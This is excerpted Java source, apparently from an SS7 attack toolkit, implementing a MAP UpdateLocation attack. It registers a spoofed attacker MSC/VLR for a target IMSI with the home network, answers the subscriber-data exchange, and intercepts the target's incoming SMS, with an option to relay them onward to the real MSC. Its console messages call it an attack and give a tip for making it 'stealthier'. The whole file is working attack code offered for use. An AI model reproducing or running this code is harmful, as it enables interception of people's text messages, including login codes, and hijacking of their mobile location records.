...
abstract class UlLowLevel implements MAPDialogListener, MAPServiceMobilityListener, MAPServiceSmsListener {
    ...
    public void init() {
        try {
            ...
            System.out.print("\033[34m[*]\033[0mFor a Stealthier attack set the VLR as the real VLR of the target\033[34m[*]\033[0m\n");
...
public class UpdateLocation extends UlLowLevel  {
    ...
    private void initSCCP() throws Exception {
        ...
        try {
            ...
            GlobalTitle0100 localMscGT = this.sccpProvider.getParameterFactory().createGlobalTitle
                    (attacker_msc, 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                            NatureOfAddress.INTERNATIONAL);
            ...
            this.sccpStack.getRouter().addRoutingAddress
                    (3, this.sccpProvider.getParameterFactory().createSccpAddress(
                            RoutingIndicator.ROUTING_BASED_ON_DPC_AND_SSN, localMscGT, CLIENT_SPC, SSN_MSC));
            ...
            SccpAddress patternLocal_MSC = this.sccpProvider.getParameterFactory().createSccpAddress
                    (RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localMscGT, CLIENT_SPC, SSN_MSC);
            ...
            this.sccpStack.getRouter().addRule
                    (3, RuleType.SOLITARY, null, OriginationType.REMOTE, patternLocal_MSC, maskLocal, 2, -1, null, 0);
    ...
    public void initiateUL() throws MAPException {
        ...
        try {
            ...
            //in UL scenario the routing is derived from the IMSI, IMSI(E.212) is exchanged to the E.214 format
            GlobalTitle0100 calledIMSIGT = this.sccpProvider.getParameterFactory().createGlobalTitle
                    (target_imsiGT, 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_MOBILE, null,
                            NatureOfAddress.INTERNATIONAL);
            ...
            SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory
                    ...
                    calledIMSIGT, SERVER_SPC, SSN_Server);
            ...
            mapDialog.addUpdateLocationRequest(imsi, msc, null, vlr, null, null,
                    null, false, false, null, null, null, false, false);


            mapDialog.send();

            System.out.println("\033[34m[*]\033[0mUpdating Location for Target's IMSI " + target_imsi + " is processing..");
    ...
    public void onInsertSubscriberDataRequest(InsertSubscriberDataRequest insertSubscriberDataRequest) {
        ...
        try {
            ...
            SupportedCamelPhases supportedCamelPhases = this.mapProvider.getMAPParameterFactory().createSupportedCamelPhases(true,true,false,false);
            MAPDialogMobility mapDialogMobility = insertSubscriberDataRequest.getMAPDialog();
            mapDialogMobility.setUserObject(invokeID);

            mapDialogMobility.addInsertSubscriberDataResponse(invokeID,null,null,null,
                    null,null,supportedCamelPhases,null,null,null);
    ...
    public void onForwardShortMessageRequest(ForwardShortMessageRequest forwardShortMessageRequest) {
        ...
        try {
            ...
            if (forward_sms.equals("y") || forward_sms.equals("yes")) {
                ...
                GlobalTitle0100 gtMsc = this.sccpProvider.getParameterFactory().createGlobalTitle
                        (attacker_msc, 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                                NatureOfAddress.INTERNATIONAL);
                ...
                mapDialog.addUpdateLocationRequest(imsi, truemsc, null, truemsc, null, null,
                        null, false, false, null, null, null, false, false);
                ...
                GlobalTitle0100 gtTrueMsc = this.sccpProvider.getParameterFactory().createGlobalTitle(
                        target_msc, 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null, NatureOfAddress.INTERNATIONAL);

                GlobalTitle0100 attack_msc = this.sccpProvider.getParameterFactory().createGlobalTitle(
                        attacker_msc, 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null, NatureOfAddress.INTERNATIONAL);

                SccpAddress callingMSC = this.sccpStack.getSccpProvider().getParameterFactory()
                        .createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, attack_msc, CLIENT_SPC, SSN_MSC);

                SccpAddress calledMSC = this.sccpStack.getSccpProvider().getParameterFactory
                        ().createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE,
                        gtTrueMsc, SERVER_SPC, SSN_MSC);
                ...
                MAPDialogSms mapDialogSms = this.mapProvider.getMAPServiceSms()
                        .createNewDialog(MAPApplicationContext.getInstance(MAPApplicationContextName.shortMsgMTRelayContext,
                                MAPApplicationContextVersion.version2), callingMSC, null, calledMSC, null);
